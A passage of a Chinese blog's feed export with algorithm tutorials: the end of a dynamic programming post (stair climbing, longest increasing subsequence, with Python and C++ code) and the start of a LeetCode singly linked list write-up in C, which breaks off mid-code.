F(N-2)</strong></p><p>有了这个方程之后，我们只需要知道<strong>走1级楼梯的走法数量与走2级楼梯的走法数量</strong>，就可以顺利地<strong>推出走任意一级楼梯的走法数量</strong></p><h4 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h4><p>需要求解n次，故时间复杂度为线性时间复杂度<strong>O(N)</strong></p><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>构造代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python语言版</span></span><br><span class="line"><span class="comment"># Python的int是真的香，i了i了</span></span><br><span class="line">a = <span class="number">1</span></span><br><span class="line">b = <span class="number">2</span></span><br><span class="line">n = int(input())</span><br><span class="line"><span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">    print(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">elif</span> n == a:</span><br><span class="line">    print(a)</span><br><span class="line"><span class="keyword">elif</span> n == b:</span><br><span class="line">    print(b)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>,n+<span class="number">1</span>):</span><br><span class="line">        a,b = b,a+b</span><br><span class="line">    print(b)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/08/30/7l4VhRzFKpJ8tEi.png" alt="image.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//C++版</span></span><br><span class="line"><span class="comment">//乱写的大数加法，将就着看⑧</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> * num1, <span class="keyword">int</span> * <span class="keyword">const</span> num2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;num2[i]!=<span class="number">-1</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        num1[i]+=num2[i];</span><br><span class="line">        <span class="keyword">if</span>(num1[i+<span class="number">1</span>]==<span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            num1[i+<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">            num1[i+<span class="number">2</span>] = <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        num1[i+<span class="number">1</span>]+=num1[i]/<span class="number">10</span>;</span><br><span class="line">        num1[i]%=<span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">out</span><span class="params">(<span class="keyword">int</span> * <span class="keyword">const</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(*num!=<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">bool</span> flag = out(num+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(flag)</span><br><span class="line">        <span class="keyword">if</span>(*num == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; *num;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> * n1,*n2,*temp;</span><br><span class="line">    n1 = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">10000</span>*<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    n2 = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">10000</span>*<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    n1[<span class="number">0</span>] = <span class="number">1</span>;n1[<span class="number">1</span>]=<span class="number">-1</span>;</span><br><span class="line">    n2[<span class="number">0</span>] = <span class="number">2</span>;n2[<span class="number">1</span>]=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="keyword">if</span>(n == <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n == <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n == <span class="number">2</span>)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            temp = n1;</span><br><span class="line">            n1 = n2;</span><br><span class="line">            n2 = temp;</span><br><span class="line">            add(n2,n1);</span><br><span class="line">        &#125;</span><br><span class="line">        out(n2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/08/30/rfa6VSDtIye34K8.png" alt="image.png"></p><h2 id="最长上升降子序列问题"><a href="#最长上升降子序列问题" class="headerlink" title="最长上升降子序列问题"></a>最长上升降子序列问题</h2><blockquote><h3 id="1759-最长上升子序列"><a href="#1759-最长上升子序列" class="headerlink" title="1759:最长上升子序列"></a>1759:最长上升子序列</h3><ul><li><p>总时间限制: 2000ms</p><ul><li>内存限制: 65536kB</li></ul></li><li><p>描述</p><p>一个数的序列<em>bi<em>，当</em>b1</em> &lt; <em>b2</em> &lt; … &lt; <em>bS<em>的时候，我们称这个序列是上升的。对于给定的一个序列(</em>a1</em>, <em>a2</em>, …, <em>aN</em>)，我们可以得到一些上升的子序列(<em>ai1</em>, <em>ai2</em>, …, <em>aiK</em>)，这里1 &lt;= <em>i1</em> &lt; <em>i2</em> &lt; … &lt; <em>iK</em> &lt;= N。比如，对于序列(1, 7, 3, 5, 9, 4, 8)，有它的一些上升子序列，如(1, 7), (3, 4, 8)等等。这些子序列中最长的长度是4，比如子序列(1, 3, 5, 8).  你的任务，就是对于给定的序列，求出最长上升子序列的长度。</p></li><li><p>输入</p><p>输入的第一行是序列的长度N (1 &lt;= N &lt;= 1000)。第二行给出序列中的N个整数，这些整数的取值范围都在0到10000。</p></li><li><p>输出</p><p>最长上升子序列的长度。</p></li><li><p>样例输入</p><p><code>7 1 7 3 5 9 4 8</code></p></li><li><p>样例输出</p><p><code>4</code></p></li><li><p>来源</p><p>翻译自 Northeastern Europe 2002, Far-Eastern Subregion 的比赛试题</p></li></ul><p><a href="http://noi.openjudge.cn/ch0206/1759/" target="_blank" rel="noopener">noi.openjudge.cn-1759：最长上升子序列</a></p></blockquote><h3 id="问题分析-1"><a href="#问题分析-1" class="headerlink" title="问题分析"></a>问题分析</h3><p>最长上升子序列问题可以说是动态规划算法最经典的一个入门问题了，无论是在各大算法书上还是竞赛书上在讲到动态规划时往往会选择使用这个问题来入门</p><p>首先我们要求解最长上升子序列，我们就必须要将该序列上的各个结点“串起来”——<strong>对于任一结点都使用一个变量来储存在该结点上的最长上升子序列中该结点的下一结点的索引</strong></p><p>其次，我们不难发现，对于任一结点与其往前所有结点构成的序列，<strong>要求解该序列中的最长上升子序列，我们只需要求解该最长上升子序列中的倒数第二个结点与往前所有结点所构成的序列、再接上该序列的最后一个结点即可</strong></p><h3 id="算法过程-1"><a href="#算法过程-1" class="headerlink" title="算法过程"></a>算法过程</h3><h4 id="状态转移方程-1"><a href="#状态转移方程-1" class="headerlink" title="状态转移方程"></a>状态转移方程</h4><p>对于任一数字序列a<sub>1</sub>,a<sub>2</sub>,…,a<sub>n</sub>，其最长上升子序列的长度为：<strong>f(a<sub>n</sub>) = f(a<sub>m</sub>)+1</strong></p><ul><li><p>其中<strong>a<sub>m</sub>&lt;=a<sub>n</sub></strong></p></li><li><p><strong>f(a<sub>m</sub>)为数字序列a<sub>1</sub>,a<sub>2</sub>,…,a<sub>n-1</sub>所能构成的最大元素a<sub>max</sub>不大于a<sub>n</sub>的上升子序列中的最大长度</strong></p></li></ul><p>那么我们便可以使用遍历的方法<strong>逐一求出序列a<sub>1</sub>，a<sub>1</sub>、a<sub>2</sub>，a<sub>1</sub>、a<sub>2</sub>、a<sub>3</sub>，…，a<sub>1</sub>、a<sub>2</sub>、a<sub>3</sub>、…、a<sub>n</sub>中的最长上升子序列的长度</strong></p><h4 id="具体架构"><a href="#具体架构" class="headerlink" title="具体架构"></a>具体架构</h4><p>状态转移方程构造出来后，接下来的代码就很好写了。</p><p>我们选择采用一个<strong>三维数组</strong>来储存结点信息</p><ul><li>第一维：<strong>结点的值</strong></li><li>第二维：<strong>结点上的最长上升子序列的长度</strong></li><li>第三维：<strong>结点上的最长上升子序列中该结点的下一结点的索引</strong></li></ul><p>我们采用两层循环来对各个结点进行遍历:</p><ul><li>第一层循环遍历每一个结点</li><li>第二层循环遍历初始节点到第一层循环结点的前一结点求解到该结点的最长上升子序列</li></ul><h4 id="时间复杂度-1"><a href="#时间复杂度-1" class="headerlink" title="时间复杂度"></a>时间复杂度</h4><p>两层循环嵌套，我们很容易得出时间复杂度为<strong>O（n^2）</strong></p><h3 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h3><p>构造代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, lis[<span class="number">1010</span>][<span class="number">3</span>]=&#123;<span class="number">0</span>&#125;,_max = <span class="number">-1</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; lis[i][<span class="number">0</span>];</span><br><span class="line">        lis[i][<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        lis[i][<span class="number">2</span>] = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;i;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(lis[i][<span class="number">0</span>]&gt;lis[j][<span class="number">0</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//lis[i][1] = lis[i][1]&gt;lis[j][1]+1?lis[i][1]:lis[j][1]+1,lis[i][2] = j;</span></span><br><span class="line">                <span class="comment">//it's too hard to understand, so I chose the following one to get it clear</span></span><br><span class="line">                <span class="keyword">if</span>(lis[i][<span class="number">1</span>]&lt;=lis[j][<span class="number">1</span>]+<span class="number">1</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    lis[i][<span class="number">1</span>] = lis[j][<span class="number">1</span>]+<span class="number">1</span>;</span><br><span class="line">                    lis[i][<span class="number">2</span>] = j;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        _max = lis[i][<span class="number">1</span>]&gt;_max?lis[i][<span class="number">1</span>]:_max;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; _max;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/08/30/ecDdL9QVxnHBl8r.png" alt="image.png"></p><h2 id="0-1-背包问题"><a href="#0-1-背包问题" class="headerlink" title="0 1 背包问题"></a>0 1 背包问题</h2><blockquote><p>咕了，下次接着更</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x00-绪论&quot;&gt;&lt;a href=&quot;#0x00-绪论&quot; class=&quot;headerlink&quot; title=&quot;0x00.绪论&quot;&gt;&lt;/a&gt;0x00.绪论&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;动态规划&lt;/strong&gt;（&lt;strong&gt;Dynamic Programming&lt;/strong&gt;）是一种通过把原问题分解为相对简单的子问题的方式求解复杂问题的方法。同时也是各类信息学竞赛（ Olympiad in Informatics ）中较为常用的算法之一。&lt;/p&gt;
&lt;p&gt;作为前·蒟蒻·OIer，对动态规划也是稍微了解一点点的XD，所以今天来简单地讲讲这个算法XD&lt;del&gt;就当复习了&lt;/del&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;注：你一定想不到这篇文章拖了4个月才开始动笔2333333&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="算法浅析" scheme="http://archive.next.arttnba3.cn/categories/%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/"/>
    
    
    <category term="python" scheme="http://archive.next.arttnba3.cn/tags/python/"/>
    
    <category term="算法" scheme="http://archive.next.arttnba3.cn/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="C/C++" scheme="http://archive.next.arttnba3.cn/tags/C-C/"/>
    
    <category term="动态规划" scheme="http://archive.next.arttnba3.cn/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
    
  </entry>
  
  <entry>
    <title>【OJ-0x0001-Leetcode】单向链表部分write up by arttnba3</title>
    <link href="http://archive.next.arttnba3.cn/2020/04/21/%E3%80%90OJ-0x0001-Leetcode%E3%80%91%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8%E9%83%A8%E5%88%86write-up-by-arttnba3/"/>
    <id>http://archive.next.arttnba3.cn/2020/04/21/%E3%80%90OJ-0x0001-Leetcode%E3%80%91%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8%E9%83%A8%E5%88%86write-up-by-arttnba3/</id>
    <published>2020-04-21T08:57:45.000Z</published>
    <updated>2020-11-20T05:51:51.117Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-绪论"><a href="#0x00-绪论" class="headerlink" title="0x00.绪论"></a>0x00.绪论</h1><p>leetcode上面的链表题很有意思，最近做到我废寝忘食都写不出来，所以推荐大家都去写一写（逃</p><p>说实话双向链表比单向链表方便的太多了（笑），<del>这点空间复杂度不算什么，建议大家都去写双向链表（不）</del></p><p>不过其实相对于空间复杂度，我更看重时间复杂度，空间复杂度再高一般也不容易爆，然而时间复杂度稍微高一点点往往就容易TLE…（来自OI狗的怨念）</p><p>顺便作为大括号换行党吐槽一下Leetcode的不换行机制😡</p><p>注：因为题是写不完的，所以这篇文章会不定期的进行更新www</p><p>最后一次更新日期为：2020.10.9（终于等来的更新？</p><a id="more"></a><h2 id="Pre-单向链表构造方式"><a href="#Pre-单向链表构造方式" class="headerlink" title="Pre:单向链表构造方式"></a>Pre:单向链表构造方式</h2><p>如下，对链表不了解的可以康康我先前写的关于链表的<a href="https://blog.csdn.net/arttnba3/article/details/101383915" target="_blank" rel="noopener">博文</a>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> val;<span class="comment">//该节点的值，也可以是其他类型甚至是多个变量</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>*<span class="title">next</span>;</span><span class="comment">//指向下一节点的指针</span></span><br><span class="line">&#125;LN;<span class="comment">//通过typedef以达到使用新关键字LN声明ListNode类型结构体变量的目的</span></span><br></pre></td></tr></table></figure><blockquote><p>（大概长这个样子）<br><img src="https://img-blog.csdnimg.cn/20191105004247883.png" alt="在这里插入图片描述"></p></blockquote><h1 id="0x01-难度：简单"><a href="#0x01-难度：简单" class="headerlink" title="0x01.难度：简单"></a>0x01.难度：简单</h1><h2 id="0x00-删除链表中的节点"><a href="#0x00-删除链表中的节点" class="headerlink" title="0x00.删除链表中的节点"></a>0x00.<a href="https://leetcode-cn.com/problems/delete-node-in-a-linked-list" target="_blank" rel="noopener">删除链表中的节点</a></h2><blockquote><p>请编写一个函数，使其可以删除某个链表中给定的（非末尾）节点，你将只被给定要求被删除的节点。</p><p>现有一个链表 – head = [4,5,1,9]，它可以表示为:</p><p>示例 1:</p><p>输入: head = [4,5,1,9], node = 5 输出: [4,1,9] 解释: 给定你链表中值为 5<br>的第二个节点，那么在调用了你的函数之后，该链表应变为 4 -&gt; 1 -&gt; 9. 示例 2:</p><p>输入: head = [4,5,1,9], node = 1 输出: [4,5,9] 解释: 给定你链表中值为 1<br>的第三个节点，那么在调用了你的函数之后，该链表应变为 4 -&gt; 5 -&gt; 9.  </p><p>说明:</p><p>链表至少包含两个节点。 链表中所有节点的值都是唯一的。 给定的节点为非末尾节点并且一定是链表中的一个有效节点。<br>不要从你的函数中返回任何结果。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/delete-node-in-a-linked-list" target="_blank" rel="noopener">https://leetcode-cn.com/problems/delete-node-in-a-linked-list</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>题目当中只给你一个节点，就是要删除的节点，但是在一个单向链表当中，你无法知道这个节点的上一个节点的地址，如何删除？</p><p><strong>只要把这个节点变成自己的下一个节点就好了嘛www</strong></p><blockquote><p>注意：在leetcode上面提交时虽然不能使用free()释放被替换节点的内存，但是在实际写删除节点的代码时一定要注意及时释放内存！</p><p>注意2：题目虽然保证了输入的绝对合法性，但是在实际写代码时永远不要相信用户的输入！</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">deleteNode</span><span class="params">(struct ListNode* node)</span> </span>&#123;</span><br><span class="line">    node-&gt;val=node-&gt;next-&gt;val;</span><br><span class="line">    node-&gt;next=node-&gt;next-&gt;next;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20191107142009400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FydHRuYmEz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>这么简短的代码还会有那么高的空间复杂度……?</p></blockquote><h2 id="0x01-反转链表"><a href="#0x01-反转链表" class="headerlink" title="0x01.反转链表"></a>0x01.<a href="https://leetcode-cn.com/problems/reverse-linked-list" target="_blank" rel="noopener">反转链表</a></h2><blockquote><p>反转一个单链表。</p><p>示例:</p><p>输入: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL<br>输出: 5-&gt;4-&gt;3-&gt;2-&gt;1-&gt;NULL<br>进阶:<br>你可以迭代或递归地反转链表。你能否用两种方法解决这道题？</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/reverse-linked-list" target="_blank" rel="noopener">https://leetcode-cn.com/problems/reverse-linked-list</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><h3 id="迭代法"><a href="#迭代法" class="headerlink" title="迭代法"></a>迭代法</h3><p>说实话一开始我想的是像数组一样进行交换，但是那样会很麻烦并且时间复杂度会很高，空间复杂度甚至会翻倍</p><p>后面看了看大佬的博文，想到可以对这个单向链表进行<strong>重构</strong></p><p>重新将这个单向链表构造成其反转链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct ListNode* <span class="title">reverseList</span><span class="params">(struct ListNode* head)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(head==<span class="literal">NULL</span>||head-&gt;next==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">ptr1</span> = <span class="title">head</span>, *<span class="title">ptr2</span> = <span class="title">head</span>-&gt;<span class="title">next</span>, *<span class="title">temp</span>;</span></span><br><span class="line">ptr1-&gt;next=<span class="literal">NULL</span>;<span class="comment">//reset it as the final node</span></span><br><span class="line">    <span class="keyword">while</span>(ptr2!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//注释以第一次构造为例进行说明</span></span><br><span class="line">        temp=ptr2-&gt;next;<span class="comment">//储存3号节点</span></span><br><span class="line">        ptr2-&gt;next=ptr1;<span class="comment">//2号节点指向1号节点</span></span><br><span class="line">        ptr1=ptr2;<span class="comment">//1号节点变为2号节点（待指向节点）</span></span><br><span class="line">        ptr2=temp;<span class="comment">//2号节点变为3号节点（下一次循环的流程将会使3号指向2号）</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> ptr1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//一年后盲写的版本</span></span><br><span class="line"><span class="function">struct ListNode* <span class="title">reverseList</span><span class="params">(struct ListNode* head)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">temp</span> = <span class="title">NULL</span>, *<span class="title">temp2</span>;</span></span><br><span class="line">    <span class="keyword">while</span>(head)</span><br><span class="line">    &#123;</span><br><span class="line">        temp2 = head-&gt;next;</span><br><span class="line">        head-&gt;next = temp;</span><br><span class="line">        temp = head;</span><br><span class="line">        head = temp2;</span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20191105015018971.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FydHRuYmEz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="递归法"><a href="#递归法" class="headerlink" title="递归法"></a>递归法</h3><p>基本思路其实是和迭代法是一样的，都是对链表进行<strong>重构</strong></p><p>使用函数递归找到最后一个节点使其成为第一个节点后开始进行重构</p><p>缺点就是递归会占用大量的栈空间</p><p>代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct ListNode* <span class="title">reverseList</span><span class="params">(struct ListNode* head)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(head==<span class="literal">NULL</span>||head-&gt;next==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">newhead</span> = <span class="title">reverseList</span>(<span class="title">head</span>-&gt;<span class="title">next</span>);</span><span class="comment">//从后往前遍历每个节点</span></span><br><span class="line">head-&gt;next-&gt;next = head;<span class="comment">//将当前节点的后一个节点的  next 指向当前结点</span></span><br><span class="line">head-&gt;next = <span class="literal">NULL</span>;<span class="comment">//断开当前节点指向后一个节点</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> newhead;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20191105211859691.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FydHRuYmEz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="0x02-回文链表"><a href="#0x02-回文链表" class="headerlink" title="0x02.回文链表"></a>0x02.<a href="https://leetcode-cn.com/problems/palindrome-linked-list" target="_blank" rel="noopener">回文链表</a></h2><blockquote><p>请判断一个链表是否为回文链表。</p><p>示例 1:</p><p>输入: 1-&gt;2<br>输出: false<br>示例 2:</p><p>输入: 1-&gt;2-&gt;2-&gt;1<br>输出: true<br>进阶： 你能否用 O(n) 时间复杂度和 O(1) 空间复杂度解决此题？</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/palindrome-linked-list" target="_blank" rel="noopener">https://leetcode-cn.com/problems/palindrome-linked-list</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>高空间复杂度的解法一：构建一个反向的单向链表再进行对比（一拍脑门直接想出来的解法XD</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 